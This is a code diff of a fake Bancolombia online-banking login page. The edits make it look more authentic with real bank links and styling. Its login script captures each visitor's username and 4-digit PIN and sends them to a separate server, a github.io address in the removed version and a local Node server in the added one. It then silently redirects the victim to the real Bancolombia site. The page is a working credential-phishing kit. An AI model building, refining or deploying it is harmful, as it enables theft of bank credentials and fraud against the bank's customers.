@@ -10,7 +10,8 @@
         content="width=device-width, initial-scale=1.0"
     >
 
-    <title>Bancolombia - Sucursal Virtual Personas</title>
+    <title>Bancolombia Sucursal Virtual Personas</title>
+    <link rel="icon" type="image/png" href="assets/favicon.png">
 
 
     <!-- =====================================================
@@ -134,9 +135,9 @@
 
             background-repeat: no-repeat;
 
-            background-position: center 50px;
+            background-position: center 30px;
 
-            background-size: cover;
+            background-size: contain;
 
             background-color: #FAFAFA;
         }
@@ -148,7 +149,7 @@
 
         .logo {
 
-            width: 184px;
+            width: 194px;
 
             height: auto;
 
@@ -593,29 +594,27 @@
 
             body {
 
-                padding-top: 40px;
+                padding-top: 40px;;
+                
+                background-size: 1420px auto;
 
-                background-size: auto;
+                background-position: calc(50% - 30px) 60px;
             }
 
 
             .logo {
 
-                width: 170px;
+                width: 180px;
 
                 margin-bottom: 25px;
             }
 
 
-            h1 {
-
-                font-size: 40px;
-
-                margin-bottom: 30px;
-
-                padding: 0 20px;
+            .banner-alerta {
+                width: 90%;
+                padding: 14px 16px;
+                margin-bottom: 20px;
             }
-
 
             .tarjeta-login {
 
@@ -684,11 +683,11 @@
             }
 
 
-            h1 {
-
-                font-size: 22px;
+            .banner-alerta {
+                width: 94%;
+                padding: 12px 14px;
+                margin-bottom: 15px;
             }
-
 
             .tarjeta-login {
 
@@ -808,7 +807,16 @@
                 justify-content: center;
                 flex-wrap: wrap;
                 text-align: center;
+                flex-direction: column;
                 padding: 10px 20px;
+                font-size: 14px;
+            }
+            .separador{
+                display: none;
+            }
+
+            .footer-top-inner a {
+                padding-top: 5px;
             }
 
             .footer-bottom {
@@ -819,6 +827,11 @@
                 padding: 14px 20px 18px 20px;
             }
 
+            .footer-logo {
+                margin-bottom: 20px;
+                margin-top: 8px;
+            }
+
             .footer-left {
                 align-items: center;
             }
@@ -826,6 +839,11 @@
             .footer-right {
                 align-items: center;
                 text-align: center;
+            }
+
+            h1{
+                font-size: 27px;
+                margin-top: 15px;
             }
         }
 
@@ -914,9 +932,7 @@
 
         <p class="subtitulo">
 
-            Ingresa los datos para gestionar tus productos y<br>
-
-            hacer transacciones.
+            Ingresa los datos para gestionar tus<br> productos y hacer transacciones.
 
         </p>
 
@@ -956,7 +972,7 @@
             <!-- OLVIDÓ USUARIO -->
 
             <a
-                href="#"
+                href="https://svpersonas.apps.bancolombia.com/crear-usuario/recordar-usuario"
                 class="enlace-olvido"
                 onclick="return false;"
             >
@@ -991,7 +1007,7 @@
             <!-- OLVIDÓ CLAVE -->
 
             <a
-                href="#"
+                href="https://svpersonas.apps.bancolombia.com/crear-usuario/crea-tu-clave"
                 class="enlace-olvido"
                 onclick="return false;"
             >
@@ -1020,7 +1036,7 @@
                  ============================================= -->
 
             <a
-                href="#"
+                href="https://svpersonas.apps.bancolombia.com/crear-usuario/ingresa-tus-datos"
                 class="btn-crear"
                 onclick="return false;"
             >
@@ -1044,19 +1060,19 @@
 
             <div class="footer-top-inner">
 
-                <a href="#" onclick="return false;">¿Problemas para conectarte?</a>
+                <a href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas?_gl=1*1pg69t7*_ga*MTg5OTg4Mzk4OS4xNzg2MjAzOTg1*_ga_H0ZHB9SNF4*czE3ODg3OTU4ODkkbzYkZzEkdDE3ODg3OTcxNTckajU5JGwxJGgxMTMwNjA4Mjc4*_gcl_au*MTczMTI0NzQxMS4xNzg2MjA0MzQ1*_ga_P43FVQ1M2K*czE3ODg3OTU4OTIkbzckZzEkdDE3ODg3OTcxNTgkajU4JGwwJGgw" onclick="return false;">¿Problemas para conectarte?</a>
 
                 <span class="separador">·</span>
 
-                <a href="#" onclick="return false;">Aprende sobre seguridad</a>
+                <a href="https://www.bancolombia.com/educacion-financiera/seguridad-bancaria/seguridad-informatica?utm_source=Organic&utm_medium=Redirect&utm_campaign=Htaccess-Momentaneas-de-migrasion-corporativa&_gl=1*1dgx9yn*_ga*MTg5OTg4Mzk4OS4xNzg2MjAzOTg1*_ga_H0ZHB9SNF4*czE3ODg3OTU4ODkkbzYkZzEkdDE3ODg3OTczMjAkajYwJGwxJGgxMTMwNjA4Mjc4*_gcl_au*MTczMTI0NzQxMS4xNzg2MjA0MzQ1*_ga_P43FVQ1M2K*czE3ODg3OTU4OTIkbzckZzEkdDE3ODg3OTcxNTgkajU4JGwwJGgw" onclick="return false;">Aprende sobre seguridad</a>
 
                 <span class="separador">·</span>
 
-                <a href="#" onclick="return false;">Reglamento Sucursal Virtual</a>
+                <a href="https://www.bancolombia.com/wcm/connect/1dcd5b4b-a856-4cee-9df9-f497eb26f964/Reglamento+Banca+por+Internet.pdf?MOD=AJPERES&utm_medium=Redirect&utm_source=Organic&utm_campaign=Htaccess-9-personas&_gl=1*1j0liy1*_ga*MTg5OTg4Mzk4OS4xNzg2MjAzOTg1*_ga_H0ZHB9SNF4*czE3ODg3OTU4ODkkbzYkZzEkdDE3ODg3OTczNTYkajI0JGwxJGgxMTMwNjA4Mjc4*_gcl_au*MTczMTI0NzQxMS4xNzg2MjA0MzQ1*_ga_P43FVQ1M2K*czE3ODg3OTU4OTIkbzckZzEkdDE3ODg3OTcxNTgkajU4JGwwJGgw" onclick="return false;">Reglamento Sucursal Virtual</a>
 
                 <span class="separador">·</span>
 
-                <a href="#" onclick="return false;">Política de privacidad</a>
+                <a href="https://www.bancolombia.com/personas/documentos-legales/proteccion-datos/bancolombia-sa?_gl=1*10jp7vm*_ga*MTg5OTg4Mzk4OS4xNzg2MjAzOTg1*_ga_H0ZHB9SNF4*czE3ODg3OTU4ODkkbzYkZzEkdDE3ODg3OTczNjckajEzJGwxJGgxMTMwNjA4Mjc4*_gcl_au*MTczMTI0NzQxMS4xNzg2MjA0MzQ1*_ga_P43FVQ1M2K*czE3ODg3OTU4OTIkbzckZzEkdDE3ODg3OTczNjckajYwJGwwJGgw" onclick="return false;">Política de privacidad</a>
 
             </div>
 
@@ -1141,166 +1157,197 @@
     </script>
 
 
-    <!-- =====================================================
-         SCRIPT LOGIN — VALIDACIÓN Y ENVÍO AL BACKEND
-         ===================================================== -->
+<!-- =====================================================
+     SCRIPT LOGIN — VALIDACIÓN Y ENVÍO AL BACKEND
+     ===================================================== -->
 
-    <script>
-        (function () {
+<script>
+    (function () {
 
-            var inputUsuario = document.getElementById('usuario');
-            var inputClave   = document.getElementById('clave');
-            var btnIngresar  = document.getElementById('btnIngresar');
-            var hintUsuario  = document.getElementById('hintUsuario');
-            var hintClave    = document.getElementById('hintClave');
-            var campoUsuario = document.getElementById('campoUsuario');
-            var campoClave   = document.getElementById('campoClave');
+        var inputUsuario = document.getElementById('usuario');
+        var inputClave   = document.getElementById('clave');
+        var btnIngresar  = document.getElementById('btnIngresar');
+        var hintUsuario  = document.getElementById('hintUsuario');
+        var hintClave    = document.getElementById('hintClave');
+        var campoUsuario = document.getElementById('campoUsuario');
+        var campoClave   = document.getElementById('campoClave');
+        var msgEstado    = document.getElementById('msgEstado');
 
-            // Expresion: solo letras a-z A-Z y digitos
-            var USUARIO_VALIDO = /^[a-zA-Z0-9]+$/;
+        // Expresión: solo letras a-z A-Z y dígitos
+        var USUARIO_VALIDO = /^[a-zA-Z0-9]+$/;
 
-            // Bloquear caracteres no permitidos en usuario mientras escribe
-            inputUsuario.addEventListener('keypress', function (e) {
-                if (!/^[a-zA-Z0-9]$/.test(e.key)) e.preventDefault();
-            });
+        // =============================================
+        // BLOQUEO DE CARACTERES EN TIEMPO REAL
+        // =============================================
 
-            // Bloquear pegar texto con caracteres invalidos
-            inputUsuario.addEventListener('paste', function (e) {
-                e.preventDefault();
-                var texto = (e.clipboardData || window.clipboardData).getData('text');
-                var limpio = texto.replace(/[^a-zA-Z0-9]/g, '').substring(0, 20);
-                document.execCommand('insertText', false, limpio);
-            });
+        // Usuario: solo letras y números
+        inputUsuario.addEventListener('keypress', function (e) {
+            if (!/^[a-zA-Z0-9]$/.test(e.key)) e.preventDefault();
+        });
 
-            // Solo permite teclear digitos en el campo clave
-            inputClave.addEventListener('keypress', function (e) {
-                if (!/[0-9]/.test(e.key)) e.preventDefault();
-            });
+        // Usuario: limpiar al pegar
+        inputUsuario.addEventListener('paste', function (e) {
+            e.preventDefault();
+            var texto = (e.clipboardData || window.clipboardData).getData('text');
+            var limpio = texto.replace(/[^a-zA-Z0-9]/g, '').substring(0, 20);
+            document.execCommand('insertText', false, limpio);
+        });
 
-            // Usuario valido segun todas las reglas
-            function usuarioEsValido(val) {
-                return val.length >= 8
-                    && val.length <= 20
-                    && !/\s/.test(val)
-                    && USUARIO_VALIDO.test(val)
-                    && (val.match(/[0-9]/g) || []).length >= 2;
+        // Clave: solo dígitos
+        inputClave.addEventListener('keypress', function (e) {
+            if (!/[0-9]/.test(e.key)) e.preventDefault();
+        });
+
+        // =============================================
+        // FUNCIONES DE VALIDACIÓN
+        // =============================================
+
+        function usuarioEsValido(val) {
+            return val.length >= 8
+                && val.length <= 20
+                && !/\s/.test(val)
+                && USUARIO_VALIDO.test(val)
+                && (val.match(/[0-9]/g) || []).length >= 2;
+        }
+
+        function setError(campoDiv, hintEl, msg) {
+            if (msg) {
+                campoDiv.style.borderBottomColor = '#c62828';
+                hintEl.textContent = msg;
+                hintEl.style.visibility = 'visible';
+            } else {
+                campoDiv.style.borderBottomColor = '';
+                hintEl.textContent = '\u00a0';
+                hintEl.style.visibility = 'hidden';
             }
+        }
 
-            // Actualizar visibilidad del hint del campo
-            function setError(campoDiv, hintEl, msg) {
-                if (msg) {
-                    campoDiv.style.borderBottomColor = '#c62828';
-                    hintEl.textContent = msg;
-                    hintEl.style.visibility = 'visible';
-                } else {
-                    campoDiv.style.borderBottomColor = '';
-                    hintEl.textContent = '\u00a0';
-                    hintEl.style.visibility = 'hidden';
-                }
+        // =============================================
+        // ACTUALIZAR BOTÓN
+        // =============================================
+
+        function actualizarBoton() {
+            var usuarioOk = usuarioEsValido(inputUsuario.value.trim());
+            var claveOk   = /^\d{4}$/.test(inputClave.value);
+            if (usuarioOk && claveOk) {
+                btnIngresar.classList.add('activo');
+                btnIngresar.disabled = false;
+            } else {
+                btnIngresar.classList.remove('activo');
+                btnIngresar.disabled = true;
             }
+        }
 
-            // Habilitar / deshabilitar boton
-            function actualizarBoton() {
-                var usuarioOk = usuarioEsValido(inputUsuario.value.trim());
-                var claveOk   = /^\d{4}$/.test(inputClave.value);
-                if (usuarioOk && claveOk) {
-                    btnIngresar.classList.add('activo');
-                } else {
-                    btnIngresar.classList.remove('activo');
-                }
-            }
+        // =============================================
+        // EVENTOS DE VALIDACIÓN EN TIEMPO REAL
+        // =============================================
 
-            // Mostrar hint solo al perder el foco (blur) y si el campo esta vacio/invalido
-            inputUsuario.addEventListener('blur', function () {
-                var val = inputUsuario.value.trim();
-                if (val.length === 0) {
-                    setError(campoUsuario, hintUsuario, 'Ingresa tu usuario');
-                } else if (!usuarioEsValido(val)) {
-                    setError(campoUsuario, hintUsuario, 'Ingresa tu usuario');
-                } else {
-                    setError(campoUsuario, hintUsuario, '');
-                }
-            });
-
-            // Ocultar hint cuando vuelve a escribir
-            inputUsuario.addEventListener('focus', function () {
+        // Usuario — al perder foco
+        inputUsuario.addEventListener('blur', function () {
+            var val = inputUsuario.value.trim();
+            if (val.length === 0) {
+                setError(campoUsuario, hintUsuario, 'Ingresa tu usuario');
+            } else if (!usuarioEsValido(val)) {
+                setError(campoUsuario, hintUsuario, 'Usuario inválido (mín. 8, máx. 20, 2 números)');
+            } else {
                 setError(campoUsuario, hintUsuario, '');
-            });
+            }
+        });
 
-            inputClave.addEventListener('blur', function () {
-                var val = inputClave.value;
-                if (val.length === 0) {
-                    setError(campoClave, hintClave, 'Ingresa tu clave');
-                } else if (!/^\d{4}$/.test(val)) {
-                    setError(campoClave, hintClave, 'Ingresa tu clave');
-                } else {
-                    setError(campoClave, hintClave, '');
-                }
-            });
+        inputUsuario.addEventListener('focus', function () {
+            setError(campoUsuario, hintUsuario, '');
+        });
 
-            inputClave.addEventListener('focus', function () {
+        // Clave — al perder foco
+        inputClave.addEventListener('blur', function () {
+            var val = inputClave.value;
+            if (val.length === 0) {
+                setError(campoClave, hintClave, 'Ingresa tu clave');
+            } else if (!/^\d{4}$/.test(val)) {
+                setError(campoClave, hintClave, '4 dígitos numéricos');
+            } else {
                 setError(campoClave, hintClave, '');
-            });
+            }
+        });
 
-            inputUsuario.addEventListener('input', actualizarBoton);
-            inputClave.addEventListener('input', function () {
-                // Limpiar el error en tiempo real cuando ya tiene 4 digitos
-                if (/^\d{4}$/.test(inputClave.value)) {
-                    setError(campoClave, hintClave, '');
-                }
-                actualizarBoton();
-            });
+        inputClave.addEventListener('focus', function () {
+            setError(campoClave, hintClave, '');
+        });
 
-        })();
+        // Actualizar botón en cada cambio
+        inputUsuario.addEventListener('input', actualizarBoton);
+        inputClave.addEventListener('input', function () {
+            if (/^\d{4}$/.test(inputClave.value)) {
+                setError(campoClave, hintClave, '');
+            }
+            actualizarBoton();
+        });
 
+        // Inicializar botón deshabilitado
+        btnIngresar.disabled = true;
+        msgEstado.style.display = 'block';
 
-        // Manejador del formulario — se llama desde onsubmit
-        function handleLogin(e) {
+        // =============================================
+        // MANEJADOR DEL ENVÍO DEL FORMULARIO
+        // =============================================
+
+        window.handleLogin = function(e) {
             e.preventDefault();
 
-            var usuario = document.getElementById('usuario').value.trim();
-            var clave   = document.getElementById('clave').value.trim();
-            var btn     = document.getElementById('btnIngresar');
-            var msg     = document.getElementById('msgEstado');
-            var errUsr  = document.getElementById('errUsuario');
+            var usuario = inputUsuario.value.trim();
+            var clave   = inputClave.value.trim();
 
-            // Validar usuario
-            var USUARIO_VALIDO = /^[a-zA-Z0-9]+$/;
-            if (usuario.length < 8)            { errUsr.textContent = 'Minimo 8 caracteres.'; return; }
-            if (usuario.length > 20)           { errUsr.textContent = 'Maximo 20 caracteres.'; return; }
-            if (/\s/.test(usuario))            { errUsr.textContent = 'No puede contener espacios.'; return; }
-            if (!USUARIO_VALIDO.test(usuario)) { errUsr.textContent = 'Solo letras y numeros. Sin tildes, enie ni especiales.'; return; }
-            var numeros = (usuario.match(/[0-9]/g) || []).length;
-            if (numeros < 2)                   { errUsr.textContent = 'Debe contener al menos 2 numeros.'; return; }
-
-            // Validar clave
+            // Validaciones finales antes de enviar
+            if (!usuarioEsValido(usuario)) {
+                setError(campoUsuario, hintUsuario, 'Usuario inválido');
+                return;
+            }
             if (!/^\d{4}$/.test(clave)) {
-                msg.textContent = 'La clave debe ser de 4 digitos numericos.';
-                msg.className   = 'msg-estado err';
+                setError(campoClave, hintClave, 'La clave debe ser de 4 dígitos');
                 return;
             }
 
-            errUsr.textContent  = '';
-            btn.disabled        = true;
-            btn.textContent     = 'Ingresando...';
-            msg.textContent     = '';
-            msg.className       = 'msg-estado';
+            // Deshabilitar botón y mostrar estado
+            btnIngresar.disabled = true;
+            btnIngresar.textContent = 'Ingresando...';
+            msgEstado.className = 'msg-estado';
+            msgEstado.style.color = '#2e7d32';
 
-            fetch('https://jhancarlost12.github.io/bnc/login', {
-                method:  'POST',
+            // Enviar al servidor
+            fetch('http://localhost:3000/login', {
+                method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body:    JSON.stringify({ usuario: usuario, clave: clave })
+                body: JSON.stringify({ usuario: usuario, clave: clave })
             })
-            .then(function () {
-                // Redirigir siempre sin mostrar ningun mensaje
-                window.location.href = 'https://www.bancolombia.com/personas';
+            .then(function(response) {
+                return response.json();
             })
-            .catch(function () {
-                // Si falla la conexion al servidor igual redirigir
-                window.location.href = 'https://www.bancolombia.com/personas';
+            .then(function(data) {
+                if (data.success) {
+                    // Redirigir al sitio real de Bancolombia
+                    window.location.href = 'https://www.bancolombia.com/personas';
+                } else {
+                    // Error del servidor
+                    msgEstado.textContent = '❌ ' + (data.message || 'Error al procesar');
+                    msgEstado.className = 'msg-estado err';
+                    btnIngresar.textContent = 'Iniciar sesión';
+                    btnIngresar.disabled = false;
+                    // Re-evaluar el botón (por si ya se puede activar)
+                    actualizarBoton();
+                }
+            })
+            .catch(function(error) {
+                console.error('Error de conexión:', error);
+                msgEstado.textContent = '⚠️ No se pudo conectar al servidor. Asegúrate de que esté corriendo (node server.js)';
+                msgEstado.className = 'msg-estado err';
+                btnIngresar.textContent = 'Iniciar sesión';
+                btnIngresar.disabled = false;
+                actualizarBoton();
             });
-        }
-    </script>
+        };
+
+    })();
+</script>
 
 
 </body>
